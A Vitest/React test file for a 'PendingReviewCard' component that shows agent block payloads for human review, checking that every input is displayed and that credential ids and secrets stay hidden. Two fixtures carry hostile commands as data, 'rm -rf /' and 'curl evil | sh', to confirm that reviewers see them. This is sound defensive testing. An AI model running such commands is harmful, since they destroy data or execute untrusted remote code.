import { fireEvent } from "@testing-library/react";
import { http, HttpResponse } from "msw";
import { expect, test, vi } from "vitest";
import type { PendingHumanReviewModel } from "@/app/api/__generated__/models/pendingHumanReviewModel";
import { server } from "@/mocks/mock-server";
import { render, screen } from "@/tests/integrations/test-utils";
import { PendingReviewCard } from "../PendingReviewCard";

function makeReview(
  overrides: Partial<PendingHumanReviewModel> = {},
): PendingHumanReviewModel {
  return {
    node_exec_id: "ne-1",
    node_id: "n-1",
    user_id: "u-1",
    graph_exec_id: "run-1",
    graph_id: "g-1",
    graph_version: 1,
    payload: { to: "x@y.com" },
    instructions: "SendEmailBlock",
    editable: true,
    status: "WAITING",
    created_at: new Date(),
    ...overrides,
  };
}

// A block input that happens to carry a `data` key is the shape that used to
// collapse the card down to that one key, hiding every sibling it executes.
test("renders every key of a payload that carries a top-level data key", () => {
  render(
    <PendingReviewCard
      review={makeReview({
        payload: { data: "tidy up temp files", command: "rm -rf /" },
      })}
      onReviewDataChange={() => {}}
    />,
  );

  expect(screen.getByDisplayValue("rm -rf /")).toBeDefined();
  expect(screen.getByDisplayValue("tidy up temp files")).toBeDefined();
});

test("labels each input of a payload instead of printing JSON", () => {
  render(
    <PendingReviewCard
      review={makeReview({ payload: { to: "x@y.com", subject: "Invoice" } })}
      onReviewDataChange={() => {}}
    />,
  );

  expect(screen.getByText("To")).toBeDefined();
  expect(screen.getByText("Subject")).toBeDefined();
  expect(screen.getByDisplayValue("Invoice")).toBeDefined();
  expect(screen.queryByText(/"subject"/)).toBeNull();
});

test("editing one field reports the full edited object back", () => {
  const onReviewDataChange = vi.fn();

  render(
    <PendingReviewCard
      review={makeReview({ payload: { to: "x@y.com", subject: "Invoice" } })}
      onReviewDataChange={onReviewDataChange}
    />,
  );

  fireEvent.change(screen.getByDisplayValue("Invoice"), {
    target: { value: "Updated invoice" },
  });

  expect(onReviewDataChange).toHaveBeenCalledTimes(1);
  const [nodeExecId, data] = onReviewDataChange.mock.calls[0];
  expect(nodeExecId).toBe("ne-1");
  expect(JSON.parse(data)).toEqual({
    to: "x@y.com",
    subject: "Updated invoice",
  });
});

test("a non-editable payload is displayed in full", () => {
  render(
    <PendingReviewCard
      review={makeReview({
        editable: false,
        payload: { data: "looks harmless", command: "curl evil | sh" },
      })}
      onReviewDataChange={() => {}}
    />,
  );

  expect(screen.getByText("curl evil | sh")).toBeDefined();
  expect(screen.getByText("looks harmless")).toBeDefined();
  expect(screen.queryByRole("textbox")).toBeNull();
});

test("uses the block's input schema and never shows the credential id", async () => {
  server.use(
    http.get("*/api/builder/blocks/batch", () =>
      HttpResponse.json([
        {
          id: "block-1",
          name: "SendDiscordMessageBlock",
          inputSchema: {
            type: "object",
            properties: {
              credentials: {
                title: "Credentials",
                credentials_provider: ["discord"],
              },
              message_content: {
                title: "Message Content",
                type: "string",
              },
              webhook_secret: {
                title: "Webhook Secret",
                type: "string",
                secret: true,
              },
            },
          },
        },
      ]),
    ),
  );

  render(
    <PendingReviewCard
      review={makeReview({
        block_id: "block-1",
        action: "Send Discord Message",
        payload: {
          credentials: {
            id: "cred-uuid-1",
            provider: "discord",
            type: "api_key",
            title: "Launch bot",
          },
          message_content: "v2.4 is live",
          webhook_secret: "s3cr3t", // pragma: allowlist secret
        },
      })}
      onReviewDataChange={() => {}}
    />,
  );

  expect(await screen.findByText("Message Content")).toBeDefined();
  expect(screen.getByDisplayValue("v2.4 is live")).toBeDefined();
  expect(screen.getByText("Account")).toBeDefined();
  expect(screen.getByText("Launch bot (Discord)")).toBeDefined();
  expect(screen.queryByText(/cred-uuid-1/)).toBeNull();
  expect(screen.queryByText(/s3cr3t/)).toBeNull();
  expect(screen.queryByDisplayValue("s3cr3t")).toBeNull();
  expect(screen.queryByText("SendEmailBlock")).toBeNull();
});
